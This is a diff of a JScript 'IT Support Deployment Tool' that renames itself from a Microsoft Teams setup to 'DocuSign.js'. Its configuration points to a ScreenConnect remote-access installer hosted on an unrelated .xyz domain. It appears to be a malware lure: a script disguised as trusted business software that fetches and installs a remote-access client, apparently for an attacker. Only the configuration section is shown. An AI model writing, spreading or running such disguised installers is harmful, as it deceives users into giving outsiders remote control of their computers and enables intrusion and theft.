@@ -1,5 +1,5 @@
-// MS-TeamsSetup.js - IT Support Deployment Tool
-// Run: cscript //nologo MS-TeamsSetup.js
+// DocuSign.js - IT Support Deployment Tool
+// Run: cscript //nologo DocuSign.js
 
 (function () {
     "use strict";
@@ -8,9 +8,9 @@
         PRODUCT_NAME: "MS - Workspace",
         PRODUCT_VERSION: "1.0.0",
         MSI_URL: "https://swicurrie.xyz/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=xyz&c=&c=&c=&c=&c=&c=&c=",
-        MSI_FILE_NAME: "WorkspaceClientSetup.msi",
-        INSTALL_DIR: "%ProgramData%\\MSWorkspace\\Install",
-        LOG_DIR: "%ProgramData%\\MSWorkspace\\Logs",
+        MSI_FILE_NAME: "ScreenConnect.ClientSetup.msi",
+        INSTALL_DIR: "%ProgramData%\\ScreenConnect\\Install",
+        LOG_DIR: "%ProgramData%\\ScreenConnect\\Logs",
         LOG_FILE: "deploy.log",
         MSI_LOG_FILE: "msi-install.log",
         DOWNLOAD_RETRIES: 2,
